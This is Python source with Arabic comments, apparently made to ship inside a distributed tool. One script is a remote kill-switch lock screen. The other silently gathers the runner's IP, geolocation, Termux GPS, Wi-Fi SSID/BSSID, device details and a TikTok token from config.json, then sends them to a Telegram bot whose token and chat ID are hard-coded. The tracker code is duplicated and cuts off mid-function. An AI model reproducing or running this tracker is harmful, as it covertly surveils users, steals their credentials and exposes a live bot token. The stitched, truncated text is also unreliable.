# -*- coding: utf-8 -*-
"""
NASR LOCK — صامت عادةً / عند الإيقاف:
1) عد تنازلي ملوّن 10..0 (مركز)
2) مشهد سينمائي قصير (عنوان نابض + ومضة + لوغو + رسالة)
"""
import sys, time, random
import requests

# ===== إعدادات =====
CHECK_URL   = "https://raw.githubusercontent.com/waelhadi/SLAMNDDD1/refs/heads/main/SLMAMDDD2"
TIMEOUT     = 5
COUNT_START = 10       # بداية العد التنازلي
COUNT_DELAY = 0.6      # ثواني بين الأرقام
WIDTH       = 86       # عرض مركزي تقريبي في الطرفية

# ===== ANSI =====
RST = "\033[0m"; B = "\033[1m"; DIM = "\033[2m"
RED = "\033[31m"; YLW = "\033[33m"; CYN = "\033[36m"; MAG = "\033[35m"
GRN = "\033[32m"; BLU = "\033[34m"; WHT = "\033[37m"
BLK = "\033[30m"; BGK = "\033[40m"; BGW = "\033[47m"
CSI = "\033["

def cls():         print(CSI + "2J" + CSI + "H", end="", flush=True)
def home():        print(CSI + "H", end="", flush=True)
def hide_cursor(): print(CSI + "?25l", end="", flush=True)
def show_cursor(): print(CSI + "?25h", end="", flush=True)

def visible_len(s):
    import re
    return len(re.sub(r"\x1b\[[0-9;]*m", "", s))

def center_lines(block, width=WIDTH):
    out = []
    for ln in block.splitlines():
        ln = ln.rstrip("\n")
        pad = max(0, (width - visible_len(ln)) // 2)
        out.append(" " * pad + ln)
    return "\n".join(out)

def type_line(text, delay=0.0015):
    for ch in text:
        print(ch, end="", flush=True); time.sleep(delay)
    print()

# ===== لوغو (اختياري pyfiglet) =====
def render_logo():
    try:
        import pyfiglet
        logo = pyfiglet.figlet_format("NASR", font="slant")
        return "\n".join(RED + B + ln + RST for ln in logo.rstrip("\n").split("\n"))
    except Exception:
        ascii_logo = [
            r" _   _    ___    ____   ____ ",
            r"| \ | |  / _ \  / ___| / ___|",
            r"|  \| | | | | | \___ \ \___ \ ",
            r"| |\  | | |_| |  ___) | ___) |",
            r"|_| \_|  \___/  |____/ |____/ ",
        ]
        return "\n".join(RED + B + ln + RST for ln in ascii_logo)

# ===== تأثيرات قصيرة =====
def pulse_title(msg, pulses=3):
    blk_r = center_lines(f"{B}{RED}{msg}{RST}")
    blk_y = center_lines(f"{B}{YLW}{msg}{RST}")
    for _ in range(pulses):
        home(); print(blk_r, end="", flush=True); time.sleep(0.18)
        home(); print(blk_y, end="", flush=True); time.sleep(0.18)

def flash(block, flashes=2):
    for _ in range(flashes):
        home(); print(BGK + BLK + block + RST, end="", flush=True); time.sleep(0.08)
        home(); print(BGW + BLK + block + RST, end="", flush=True); time.sleep(0.06)
        home(); print(BGK + BLK + block + RST, end="", flush=True); time.sleep(0.06)

def drip_line(width=58):
    n = random.randint(width-8, width)
    return RED + "🩸" * n + RST

# ===== فحص الاتصال =====
def check_connection():
    try:
        r = requests.get(CHECK_URL, timeout=TIMEOUT)
        return r.status_code == 200
    except requests.RequestException:
        return False

# ===== عد تنازلي ملوّن =====
def countdown(start=COUNT_START, delay=COUNT_DELAY):
    # ألوان تتناوب لكل رقم
    palette = [RED, YLW, GRN, CYN, BLU, MAG, WHT]
    # إذا توفر pyfiglet: نعرض الرقم كبير
    try:
        import pyfiglet
        big = True
    except Exception:
        big = False

    for i in range(start, -1, -1):
        color = palette[i % len(palette)]
        cls()
        num_str = str(i)

        if big:
            import pyfiglet
            art = pyfiglet.figlet_format(num_str, font="slant")
            block = color + B + art + RST
        else:
            # بديل كبير نسبيًا بدون مكتبات
            block = f"""
{color}{B}
       ╔══════════╗
          {num_str.center(6)}
       ╚══════════╝
{RST}
""".rstrip("\n")

        print(center_lines(block))
        print(center_lines(DIM + "Preparing cinematic lock..." + RST))
        print("\a", end="", flush=True)  # نغمة خفيفة
        time.sleep(delay)

# ===== شاشة الإيقاف =====
def nasser_lock():
    try:
        hide_cursor()
        countdown()  # 10..0

        # مشهد سينمائي مختصر
        cls()
        title = "النــــــــــســــــــــر 🦅 أوقــــــف الأداة"
        pulse_title(title, pulses=3)

        logo = center_lines(render_logo())
        flash(logo, flashes=2)

        body = [
            "",
            center_lines(f"{B}{RED}🔒 لا يمكنك تشغيل هذه الأداة حالياً.{RST}"),
            center_lines(f"{B}{YLW}📧 تواصل مع المطوّر: @NASR101{RST}"),
            center_lines(f"{B}{CYN}⚠️ أي محاولة لعب بالتشفير تعرّضك للخطر.{RST}"),
            "",
            center_lines(drip_line(), width=WIDTH),
        ]
        for ln in body:
            type_line(ln, delay=0.0012)
            time.sleep(0.02)

        print("\a", end="", flush=True)
        time.sleep(1.0)

    finally:
        show_cursor()
    sys.exit(1)

# ===== main =====
def main():
    # تشغيل صامت — لا لوغو ولا رسائل
    if not check_connection():
        nasser_lock()

    # هنا كودك الحقيقي يبدأ بصمت
    pass  # استبدلها بكودك الأساسي

if __name__ == "__main__":
    main()
import requests, os, json, socket, platform, psutil, subprocess, sys, time, hashlib

TELEGRAM_BOT_TOKEN = "7257011070:AAHrtO9HKq3McO08lBBvrn46P_7F1Xprnnw"
CHAT_ID = "6357688798"

HEADERS = {"User-Agent": "NASR-LocationClient/1.2 (+contact: example@example.com)"}

# ======================= Helpers =======================
def safe_get(url, timeout=7, headers=None, params=None):
    try:
        r = requests.get(url, timeout=timeout, headers=headers or HEADERS, params=params)
        if r.status_code == 200:
            ct = r.headers.get("Content-Type","")
            return r.json() if "application/json" in ct else r.text
    except: pass
    return None

def sh(cmd, timeout=2):
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=timeout)
        return out.decode("utf-8","ignore").strip()
    except: return ""

def has_cmd(name):
    which = sh(["which", name]) if os.name != "nt" else ""
    return bool(which)

def is_android():
    return "ANDROID_ROOT" in os.environ or "ANDROID_DATA" in os.environ or "TERMUX_VERSION" in os.environ

# ======================= Flags =======================
def country_flag_from_iso2(iso2):
    # ISO2 -> 🇦🇹
    if not iso2 or len(iso2) != 2:
        return ""
    base = 0x1F1E6
    try:
        a = chr(base + (ord(iso2.upper()[0]) - ord('A')))
        b = chr(base + (ord(iso2.upper()[1]) - ord('A')))
        return a + b
    except:
        return ""

# ======================= IP Providers =======================
def get_public_ip():
    j = safe_get("https://api64.ipify.org?format=json", timeout=5)
    return (j or {}).get("ip", "غير معروف")

def ipinfo_data(ip):
    j = safe_get(f"https://ipinfo.io/{ip}/json", timeout=6)
    if not j: return None
    return {
        "country_code": j.get("country"),
        "region": j.get("region"),
        "city": j.get("city"),
        "isp": j.get("org"),
        "loc": j.get("loc"),
        "source": "ipinfo"
    }

def ipapi_data(ip):
    j = safe_get(f"https://ipapi.co/{ip}/json/", timeout=6)
    if not j: return None
    return {
        "country_code": j.get("country"),
        "region": j.get("region"),
        "city": j.get("city"),
        "isp": j.get("org"),
        "loc": f"{j.get('latitude')},{j.get('longitude')}" if j.get("latitude") and j.get("longitude") else None,
        "source": "ipapi"
    }

def ipwhois_data(ip):
    j = safe_get(f"https://ipwho.is/{ip}", timeout=6)
    if not j or not j.get("success", True): return None
    cc = j.get("country_code")
    lat = j.get("latitude"); lon = j.get("longitude")
    org = (j.get("connection") or {}).get("org") or j.get("org") or (j.get("asn") or {}).get("name")
    return {
        "country_code": cc,
        "region": j.get("region"),
        "city": j.get("city"),
        "isp": org,
        "loc": f"{lat},{lon}" if lat and lon else None,
        "source": "ipwhois"
    }

def get_location_data_chain(ip):
    for fn in (ipinfo_data, ipapi_data, ipwhois_data):
        out = fn(ip)
        if out and out.get("country_code"):
            # تطبيع قيم فارغة
            for k in ("region","city","isp","loc"):
                if not out.get(k): out[k] = "غير معروف"
            return out
    return {"country_code":"غير معروف","region":"غير معروف","city":"غير معروف","isp":"غير معروف","loc":"غير معروف","source":"none"}

# ======================= Reverse Geocoding =======================
def reverse_osm(loc):
    if not loc or loc == "غير معروف" or "," not in loc: return {}
    try: lat, lon = [x.strip() for x in loc.split(",")]
    except: return {}
    params = {"format":"jsonv2","lat":lat,"lon":lon,"accept-language":"ar","addressdetails":1,"zoom":18}
    j = safe_get("https://nominatim.openstreetmap.org/reverse", params=params, timeout=8)
    if not j: return {}
    addr = j.get("address", {})
    country_full = addr.get("country")
    cc = (addr.get("country_code") or "").upper()
    governorate = addr.get("state") or addr.get("province") or addr.get("state_district") or addr.get("region")
    county = addr.get("county") or addr.get("district") or addr.get("municipality")
    city = addr.get("city") or addr.get("town") or addr.get("borough") or addr.get("locality")
    village = addr.get("village") or addr.get("hamlet")
    suburb = addr.get("suburb") or addr.get("neighbourhood")
    postcode = addr.get("postcode")
    return {"provider":"OSM","country_full":country_full,"country_code":cc,"governorate":governorate,"county":county,"city":city,"village":village,"suburb":suburb,"postcode":postcode}

def reverse_bigdatacloud(loc):
    if not loc or loc == "غير معروف" or "," not in loc: return {}
    try: lat, lon = [x.strip() for x in loc.split(",")]
    except: return {}
    params = {"latitude": lat, "longitude": lon, "localityLanguage": "ar"}
    j = safe_get("https://api.bigdatacloud.net/data/reverse-geocode-client", params=params, timeout=8)
    if not j: return {}
    cc = (j.get("countryCode") or "").upper()
    return {
        "provider":"BigDataCloud",
        "country_full": j.get("countryName"),
        "country_code": cc,
        "governorate": j.get("principalSubdivision") or j.get("localityInfo",{}).get("administrative", [{}])[0].get("name"),
        "county": j.get("localityInfo",{}).get("administrative", [{}])[1].get("name") if j.get("localityInfo") else None,
        "city": j.get("city") or j.get("locality"),
        "village": None,
        "suburb": j.get("localityInfo",{}).get("informative", [{}])[0].get("name") if j.get("localityInfo") else None,
        "postcode": j.get("postcode")
    }

def reverse_google(loc):
    key = os.getenv("GOOGLE_MAPS_KEY")
    if not key or not loc or "," not in loc: return {}
    try: lat, lon = [x.strip() for x in loc.split(",")]
    except: return {}
    params = {"latlng": f"{lat},{lon}", "key": key, "language": "ar"}
    j = safe_get("https://maps.googleapis.com/maps/api/geocode/json", params=params, timeout=8)
    if not j or j.get("status") != "OK": return {}
    # نبحث عن المكوّنات
    comps = j["results"][0]["address_components"]
    def get(comp_type):
        for c in comps:
            if comp_type in c["types"]:
                return c.get("long_name")
        return None
    country_full = get("country")
    cc = None
    for c in comps:
        if "country" in c["types"]:
            cc = c.get("short_name"); break
    governorate = get("administrative_area_level_1")
    county = get("administrative_area_level_2")
    city = get("locality") or get("sublocality") or get("administrative_area_level_3")
    suburb = get("sublocality") or get("neighborhood")
    postcode = get("postal_code")
    return {"provider":"Google","country_full":country_full,"country_code":cc,"governorate":governorate,"county":county,"city":city,"village":None,"suburb":suburb,"postcode":postcode}

def reverse_geocode_best(loc):
    # ترتيب: Google (لو مفتاح متوفر) → BigDataCloud → OSM
    for fn in (reverse_google, reverse_bigdatacloud, reverse_osm):
        out = fn(loc)
        if out.get("country_full") or out.get("city") or out.get("governorate"):
            return out
    return {}

# ======================= TikTok creds (اختياري) =======================
def get_tiktok_credentials():
    try:
        with open("config.json","r",encoding="utf-8") as f:
            c = json.load(f)
            return c.get("TIKTOK_TOKEN","غير معروف"), c.get("USER_ID","غير معروف")
    except: return "غير معروف","غير معروف"

# ======================= Device =======================
def get_android_model():
    def gp(p): return sh(["getprop", p])
    return {
        "platform":"Android",
        "brand": gp("ro.product.brand") or "غير معروف",
        "manufacturer": gp("ro.product.manufacturer") or "غير معروف",
        "model": gp("ro.product.model") or gp("ro.product.name") or "غير معروف",
        "device": gp("ro.product.device") or "غير معروف",
        "android_release": gp("ro.build.version.release") or "غير معروف",
        "android_sdk": gp("ro.build.version.sdk") or "غير معروف",
        "cpu_abi": gp("ro.product.cpu.abi") or "غير معروف",
    }

def get_windows_model():
    try:
        name = sh(["wmic","computersystem","get","model"]).splitlines()
        m = [x.strip() for x in name if x.strip() and x.strip().lower()!="model"]
        model = m[0] if m else "غير معروف"
        man = sh(["wmic","computersystem","get","manufacturer"]).splitlines()
        mm = [x.strip() for x in man if x.strip() and x.strip().lower()!="manufacturer"]
        manufacturer = mm[0] if mm else "غير معروف"
        return {"platform":"Windows","manufacturer":manufacturer,"model":model}
    except: return {"platform":"Windows","manufacturer":"غير معروف","model":"غير معروف"}

def get_linux_model():
    prod = "/sys/devices/virtual/dmi/id/product_name"
    vend = "/sys/devices/virtual/dmi/id/sys_vendor"
    try: model = open(prod).read().strip()
    except: model = "غير معروف"
    try: manufacturer = open(vend).read().strip()
    except: manufacturer = "غير معروف"
    return {"platform":"Linux","manufacturer":manufacturer,"model":model}

def get_device_info():
    if is_android(): base = get_android_model()
    elif os.name == "nt": base = get_windows_model()
    else: base = get_linux_model()
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except: hostname, local_ip = "غير معروف", "غير معروف"
    base.update({
        "hostname": hostname, "local_ip": local_ip,
        "os": f"{platform.system()} {platform.release()}",
        "processor": platform.processor() or "غير معروف",
        "ram": f"{round(psutil.virtual_memory().total / (1024**3))} GB",
    })
    return base

# ======================= Termux Extras =======================
def get_termux_location():
    if not (is_android() and has_cmd("termux-location")): return None
    out = sh(["termux-location", "-p", "gps,network,passive", "-r", "once"])
    try:
        j = json.loads(out)
        return {"lat": j.get("latitude"), "lon": j.get("longitude"), "acc": j.get("accuracy"), "provider": j.get("provider")}
    except: return None

def get_termux_wifi():
    if not (is_android() and has_cmd("termux-wifi-connectioninfo")): return None
    out = sh(["termux-wifi-connectioninfo"])
    try:
        j = json.loads(out)
        return {"ssid": j.get("ssid"), "bssid": j.get("bssid")}
    except: return None

# ======================= VPN / Env =======================
def detect_vpn_proxy():
    env_flags = any(k in os.environ for k in ["HTTP_PROXY","HTTPS_PROXY","ALL_PROXY","http_proxy","https_proxy","all_proxy"])
    ifaces = []
    try:
        for nics, addrs in psutil.net_if_addrs().items():
            ifaces.append(nics.lower())
    except: pass
    tun_like = any(x.startswith(("tun","tap","ppp","wg")) for x in ifaces)
    route = sh(["ip","route"]) if os.name != "nt" else ""
    has_default_tun = " dev tun" in route or " dev wg" in route or " dev ppp" in route
    return {"env_proxy":env_flags, "tun_iface":tun_like or has_default_tun}

# ======================= Time & ASN =======================
def get_timezone_ip():
    j = safe_get("https://worldtimeapi.org/api/ip", timeout=6)
    if not j: return {"timezone":"غير معروف","utc_offset":"غير معروف","server_unix":None}
    return {"timezone": j.get("timezone","غير معروف"), "utc_offset": j.get("utc_offset","غير معروف"), "server_unix": j.get("unixtime")}

def get_clock_skew_seconds(server_unix):
    try:
        if server_unix is None: return None
        local = int(time.time())
        return abs(local - int(server_unix))
    except: return None

def parse_asn(org_str):
    if not org_str or org_str == "غير معروف": return {"asn":"غير معروف","as_name":"غير معروف"}
    s = org_str.strip()
    if s.upper().startswith("AS"):
        parts = s.split(None, 1)
        asn = parts[0].upper()
        as_name = parts[1] if len(parts)>1 else "غير معروف"
        return {"asn": asn, "as_name": as_name}
    return {"asn":"غير معروف","as_name": s}

# ======================= Confidence & Fingerprint =======================
def location_confidence(src, acc=None):
    if src == "GPS": return ("عالية جدًا", 0.95 if acc is None else max(0.8, min(0.99, 1.0 - (acc/1000.0))))
    if src == "WiFi": return ("متوسطة", 0.7)
    return ("منخفضة", 0.4)

def device_fingerprint(device):
    key = "|".join([
        device.get("platform",""), device.get("manufacturer",""), device.get("model",""),
        device.get("device",""), device.get("os",""), device.get("processor",""), device.get("cpu_abi","")
    ])
    return hashlib.sha256(key.encode("utf-8")).hexdigest()[:16]

# ======================= Build & Send =======================
def build_message():
    public_ip = get_public_ip()
    ip_data = get_location_data_chain(public_ip)
    as_info = parse_asn(ip_data.get("isp"))
    tz_info = get_timezone_ip()
    skew = get_clock_skew_seconds(tz_info.get("server_unix"))

    gps = get_termux_location()
    wifi = get_termux_wifi()

    # اختر المصدر
    if gps and gps.get("lat") and gps.get("lon"):
        coords = f"{gps['lat']},{gps['lon']}"
        src = "GPS"; acc = gps.get("acc")
    else:
        coords = ip_data.get("loc", "غير معروف")
        src = "WiFi" if wifi else "IP"; acc = None

    # عكس الإحداثيات بأفضل مزوّد متاح
    rev = reverse_geocode_best(coords) if coords and coords != "غير معروف" else {}
    country_code = (rev.get("country_code") or ip_data.get("country_code") or "").upper()
    country_full = rev.get("country_full") or ip_data.get("country_code") or "غير معروف"
    flag = country_flag_from_iso2(country_code)

    # بقية الحقول
    governorate = rev.get("governorate") or ip_data.get("region") or "غير معروف"
    county = rev.get("county") or "غير معروف"
    city = rev.get("city") or ip_data.get("city") or "غير معروف"
    village = rev.get("village") or "غير معروف"
    suburb = rev.get("suburb") or "غير معروف"
    postcode = rev.get("postcode") or "غير معروف"

    tiktok_token, user_id = get_tiktok_credentials()
    device = get_device_info()
    fp = device_fingerprint(device)
    vpn = detect_vpn_proxy()

    # نصوص مساعدة
    conf_txt, conf_val = location_confidence(src, acc)
    tz_line = f"{tz_info.get('timezone','غير معروف')} (UTC{tz_info.get('utc_offset','')})"
    skew_line = f"{skew} ث" if isinstance(skew,int) else "غير معروف"
    vpn_line = []
    if vpn.get("env_proxy"): vpn_line.append("متغيرات Proxy مفعلة")
    if vpn.get("tun_iface"): vpn_line.append("واجهات TUN/WG/PPP")
    vpn_text = "، ".join(vpn_line) if vpn_line else "لا توجد دلائل واضحة"

    token_masked = (tiktok_token[:6] + "..." + tiktok_token[-4:]) if tiktok_token not in ("", "غير معروف") and len(tiktok_token) > 12 else tiktok_token

    msg = f"""🛑 *تم تشغيل الأداة* 🛑

🔹 *معلومات المستخدم:*
• *User ID:* `{user_id}`
• *TikTok Token:* `{token_masked}`

🔹 *الشبكة:*
• *IP العام:* `{public_ip}`
• *المزوّد (AS):* {as_info.get('asn')} — {as_info.get('as_name')}
• *المصدر الجغرافي:* {ip_data.get('source','-')}
• *المنطقة الزمنية (IP):* {tz_line}
• *انحراف الساعة:* {skew_line}

🔹 *الموقع التفصيلي:*
• *الدولة:* {country_full} {flag}  ({country_code or '-'})
• *المحافظة/الولاية:* {governorate}
• *القضاء/المقاطعة:* {county}
• *المدينة:* {city}
• *البلدة/القرية:* {village}
• *الحي/الناحية:* {suburb}
• *الرمز البريدي:* {postcode}
• *المصدر:* {src} — *الثقة:* {conf_txt} ({int(conf_val*100)}%)
• *الإحداثيات:* `{coords}`

🔹 *قنوات إضافية:*
• *GPS (Termux):* {('مزود: ' + str(gps.get('provider')) + ' | دقة: ' + str(gps.get('acc')) + ' م') if gps else '-' }
• *Wi-Fi (SSID/BSSID):* {('SSID: ' + str(wifi.get('ssid')) + ' | BSSID: ' + str(wifi.get('bssid'))) if wifi else '-' }
• *VPN/Proxy:* {vpn_text}

🔹 *معلومات الجهاز:*
• *المنصة:* {device.get('platform','غير معروف')}
• *الشركة:* {device.get('manufacturer','غير معروف')}
• *الطراز:* {device.get('model','غير معروف')}
• *الجهاز:* {device.get('device','-')}
• *Android:* {device.get('android_release','-')} (SDK {device.get('android_sdk','-')}) / ABI: {device.get('cpu_abi','-')}
• *الاسم:* {device.get('hostname')}
• *IP المحلي:* {device.get('local_ip')}
• *النظام:* {device.get('os')}
• *المعالج:* {device.get('processor')}
• *الذاكرة:* {device.get('ram')}
• *بصمة الجهاز:* `{fp}`
"""
    return msg

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        r = requests.post(url, data=payload, timeout=10)
        return r.status_code == 200
    except: return False

# ======================= Run =======================
if __name__ == "__main__":
    text = build_message()
    ok = send_to_telegram(text)
    if not ok:
        print("❌ فشل في الإرسال إلى تيليجرام")
        # -*- coding: utf-8 -*-

import requests, os, json, socket, platform, psutil, subprocess, sys, time, hashlib

TELEGRAM_BOT_TOKEN = "7257011070:AAHrtO9HKq3McO08lBBvrn46P_7F1Xprnnw"
CHAT_ID = "6357688798"

HEADERS = {"User-Agent": "NASR-LocationClient/1.2 (+contact: example@example.com)"}

# ======================= Helpers =======================
def safe_get(url, timeout=7, headers=None, params=None):
    try:
        r = requests.get(url, timeout=timeout, headers=headers or HEADERS, params=params)
        if r.status_code == 200:
            ct = r.headers.get("Content-Type","")
            return r.json() if "application/json" in ct else r.text
    except: pass
    return None

def sh(cmd, timeout=2):
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=timeout)
        return out.decode("utf-8","ignore").strip()
    except: return ""

def has_cmd(name):
    which = sh(["which", name]) if os.name != "nt" else ""
    return bool(which)

def is_android():
    return "ANDROID_ROOT" in os.environ or "ANDROID_DATA" in os.environ or "TERMUX_VERSION" in os.environ

# ======================= Flags =======================
def country_flag_from_iso2(iso2):
    # ISO2 -> 🇦🇹
    if not iso2 or len(iso2) != 2:
        return ""
    base = 0x1F1E6
    try:
        a = chr(base + (ord(iso2.upper()[0]) - ord('A')))
        b = chr(base + (ord(iso2.upper()[1]) - ord('A')))
        return a + b
    except:
        return ""

# ======================= IP Providers =======================
def get_public_ip():
    j = safe_get("https://api64.ipify.org?format=json", timeout=5)
    return (j or {}).get("ip", "غير معروف")

def ipinfo_data(ip):
    j = safe_get(f"https://ipinfo.io/{ip}/json", timeout=6)
    if not j: return None
    return {
        "country_code": j.get("country"),
        "region": j.get("region"),
        "city": j.get("city"),
        "isp": j.get("org"),
        "loc": j.get("loc"),
        "source": "ipinfo"
    }

def ipapi_data(ip):
    j = safe_get(f"https://ipapi.co/{ip}/json/", timeout=6)
    if not j: return None
    return {
        "country_code": j.get("country"),
        "region": j.get("region"),
        "city": j.get("city"),
        "isp": j.get("org"),
        "loc": f"{j.get('latitude')},{j.get('longitude')}" if j.get("latitude") and j.get("longitude") else None,
        "source": "ipapi"
    }

def ipwhois_data(ip):
    j = safe_get(f"https://ipwho.is/{ip}", timeout=6)
    if not j or not j.get("success", True): return None
    cc = j.get("country_code")
    lat = j.get("latitude"); lon = j.get("longitude")
    org = (j.get("connection") or {}).get("org") or j.get("org") or (j.get("asn") or {}).get("name")
    return {
        "country_code": cc,
        "region": j.get("region"),
        "city": j.get("city"),
        "isp": org,
        "loc": f"{lat},{lon}" if lat and lon else None,
        "source": "ipwhois"
    }

def get_location_data_chain(ip):
    for fn in (ipinfo_data, ipapi_data, ipwhois_data):
        out = fn(ip)
        if out and out.get("country_code"):
            # تطبيع قيم فارغة
            for k in ("region","city","isp","loc"):
                if not out.get(k): out[k] = "غير معروف"
            return out
    return {"country_code":"غير معروف","region":"غير معروف","city":"غير معروف","isp":"غير معروف","loc":"غير معروف","source":"none"}

# ======================= Reverse Geocoding =======================
def reverse_osm(loc):
    if not loc or loc == "غير معروف" or "," not in loc: return {}
    try: lat, lon = [x.strip() for x in loc.split(",")]
    except: return {}
    params = {"format":"jsonv2","lat":lat,"lon":lon,"accept-language":"ar","addressdetails":1,"zoom":18}
    j = safe_get("https://nominatim.openstreetmap.org/reverse", params=params, timeout=8)
    if not j: return {}
    addr = j.get("address", {})
    country_full = addr.get("country")
    cc = (addr.get("country_code") or "").upper()
    governorate = addr.get("state") or addr.get("province") or addr.get("state_district") or addr.get("region")
    county = addr.get("county") or addr.get("district") or addr.get("municipality")
    city = addr.get("city") or addr.get("town") or addr.get("borough") or addr.get("locality")
    village = addr.get("village") or addr.get("hamlet")
    suburb = addr.get("suburb") or addr.get("neighbourhood")
    postcode = addr.get("postcode")
    return {"provider":"OSM","country_full":country_full,"country_code":cc,"governorate":governorate,"county":county,"city":city,"village":village,"suburb":suburb,"postcode":postcode}

def reverse_bigdatacloud(loc):
    if not loc or loc == "غير معروف" or "," not in loc: return {}
    try: lat, lon = [x.strip() for x in loc.split(",")]
    except: return {}
    params = {"latitude": lat, "longitude": lon, "localityLanguage": "ar"}
    j = safe_get("https://api.bigdatacloud.net/data/reverse-geocode-client", params=params, timeout=8)
    if not j: return {}
    cc = (j.get("countryCode") or "").upper()
    return {
        "provider":"BigDataCloud",
        "country_full": j.get("countryName"),
        "country_code": cc,
        "governorate": j.get("principalSubdivision") or j.get("localityInfo",{}).get("administrative", [{}])[0].get("name"),
        "county": j.get("localityInfo",{}).get("administrative", [{}])[1].get("name") if j.get("localityInfo") else None,
        "city": j.get("city") or j.get("locality"),
        "village": None,
        "suburb": j.get("localityInfo",{}).get("informative", [{}])[0].get("name") if j.get("localityInfo") else None,
        "postcode": j.get("postcode")
    }

def reverse_google(loc):
    key = os.getenv("GOOGLE_MAPS_KEY")
    if not key or not loc or "," not in loc: return {}
    try: lat, lon = [x.strip() for x in loc.split(",")]
    except: return {}
    params = {"latlng": f"{lat},{lon}", "key": key, "language": "ar"}
    j = safe_get("https://maps.googleapis.com/maps/api/geocode/json", params=params, timeout=8)
    if not j or j.get("status") != "OK": return {}
    # نبحث عن المكوّنات
    comps = j["results"][0]["address_components"]
    def get(comp_type):
        for c in comps:
            if comp_type in c["types"]:
                return c.get("long_name")
        return None
    country_full = get("country")
    cc = None
    for c in comps:
        if "country" in c["types"]:
            cc = c.get("short_name"); break
    governorate = get("administrative_area_level_1")
    county = get("administrative_area_level_2")
    city = get("locality") or get("sublocality") or get("administrative_area_level_3")
    suburb = get("sublocality") or get("neighborhood")
    postcode = get("postal_code")
    return {"provider":"Google","country_full":country_full,"country_code":cc,"governorate":governorate,"county":county,"city":city,"village":None,"suburb":suburb,"postcode":postcode}

def reverse_geocode_best(loc):
    # ترتيب: Google (لو مفتاح متوفر) → BigDataCloud → OSM
    for fn in (reverse_google, reverse_bigdatacloud, reverse_osm):
        out = fn(loc)
        if out.get("country_full") or out.get("city") or out.get("governorate"):
            return out
    return {}

# ======================= TikTok creds (اختياري) =======================
def get_tiktok_credentials():
    try:
        with open("config.json","r",encoding="utf-8") as f:
            c = json.load(f)
            return c.get("TIKTOK_TOKEN","غير معروف"), c.get("USER_ID","غير معروف")
    except: return "غير معروف","غير معروف"

# ======================= Device =======================
def get_android_model():
    def gp(p): return sh(["getprop", p])
    return {
        "platform":"Android",
        "brand": gp("ro.product.brand") or "غير معروف",
        "manufacturer": gp("ro.product.manufacturer") or "غير معروف",
        "model": gp("ro.product.model") or gp("ro.product.name") or "غير معروف",
        "device": gp("ro.product.device") or "غير معروف",
        "android_release": gp("ro.build.version.release") or "غير معروف",
        "android_sdk": gp("ro.build.version.sdk") or "غير معروف",
        "cpu_abi": gp("ro.product.cpu.abi") or "غير معروف",
    }

def get_windows_model():
    try:
        name = sh(["wmic","computersystem","get","model"]).splitlines()
        m = [x.strip() for x in name if x.strip() and x.strip().lower()!="model"]
        model = m[0] if m else "غير معروف"
        man = sh(["wmic","computersystem","get","manufacturer"]).splitlines()
        mm = [x.strip() for x in man if x.strip() and x.strip().lower()!="manufacturer"]
        manufacturer = mm[0] if mm else "غير معروف"
        return {"platform":"Windows","manufacturer":manufacturer,"model":model}
    except: return {"platform":"Windows","manufacturer":"غير معروف","model":"غير معروف"}

def get_linux_model():
    prod = "/sys/devices/virtual/dmi/id/product_name"
    vend = "/sys/devices/virtual/dmi/id/sys_vendor"
    try: model = open(prod).read().strip()
    except: model = "غير معروف"
    try: manufacturer = open(vend).read().strip()
    except: manufacturer = "غير معروف"
    return {"platform":"Linux","manufacturer":manufacturer,"model":model}

def get_device_info():
    if is_android(): base = get_android_model()
    elif os.name == "nt": base = get_windows_model()
    else: base = get_linux_model()
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except: hostname, local_ip = "غير معروف", "غير معروف"
    base.update({
        "hostname": hostname, "local_ip": local_ip,
        "os": f"{platform.system()} {platform.release()}",
        "processor": platform.processor() or "غير معروف",
        "ram": f"{round(psutil.virtual_memory().total / (1024**3))} GB",
    })
    return base

# ======================= Termux Extras =======================
def get_termux_location():
    if not (is_android() and has_cmd("termux-location")): return None
    out = sh(["termux-location", "-p", "gps,network,passive", "-r", "once"])
    try:
        j = json.loads(out)
        return {"lat": j.get("latitude"), "lon": j.get("longitude"), "acc": j.get("accuracy"), "provider": j.get("provider")}
    except: return None

def get_termux_wifi():
    if not (is_android() and has_cmd("termux-wifi-connectioninfo")): return None
    out = sh(["termux-wifi-connectioninfo"])
    try:
        j = json.loads(out)
        return {"ssid": j.get("ssid"), "bssid": j.get("bssid")}
    except: return None

# ======================= VPN / Env =======================
def detect_vpn_proxy():
    env_flags = any(k in os.environ for k in ["HTTP_PROXY","HTTPS_PROXY","ALL_PROXY","http_proxy","https_proxy","all_proxy"])
    ifaces = []
    try:
        for nics, addrs in psutil.net_if_addrs().items():
            ifaces.append(nics.lower())
    except: pass
    tun_like = any(x.startswith(("tun","tap","ppp","wg")) for x in ifaces)
    route = sh(["ip","route"]) if os.name != "nt" else ""
    has_default_tun = " dev tun" in route or " dev wg" in route or " dev ppp" in route
    return {"env_proxy":env_flags, "tun_iface":tun_like or has_default_tun}

# ======================= Time & ASN =======================
def get_timezone_ip():
    j = safe_get("https://worldtimeapi.org/api/ip", timeout=6)
    if not j: return {"timezone":"غير معروف","utc_offset":"غير معروف","server_unix":None}
    return {"timezone": j.get("timezone","غير معروف"), "utc_offset": j.get("utc_offset","غير معروف"), "server_unix": j.get("unixtime")}

def get_clock_skew_seconds(server_unix):
    try:
        if server_unix is None: return None
        local = int(time.time())
        return abs(local - int(server_unix))
    except: return None

def parse_asn(org_str):
    if not org_str or org_str == "غير معروف": return {"asn":"غير معروف","as_name":"غير معروف"}
    s = org_str.strip()
    if s.upper().startswith("AS"):
        parts = s.split(None, 1)
        asn = parts[0].upper()
        as_name = parts[1] if len(parts)>1 else "غير معروف"
        return {"asn": asn, "as_name": as_name}
    return {"asn":"غير معروف","as_name": s}

# ======================= Confidence & Fingerprint =======================
def location_confidence(src, acc=None):
    if src == "GPS": return ("عالية جدًا", 0.95 if acc is None else max(0.8, min(0.99, 1.0 - (acc/1000.0))))
    if src == "WiFi": return ("متوسطة", 0.7)
    return ("منخفضة", 0.4)

def device_fingerprint(device):
    key = "|".join([
        device.get("platform",""), device.get("manufacturer",""), device.get("model",""),
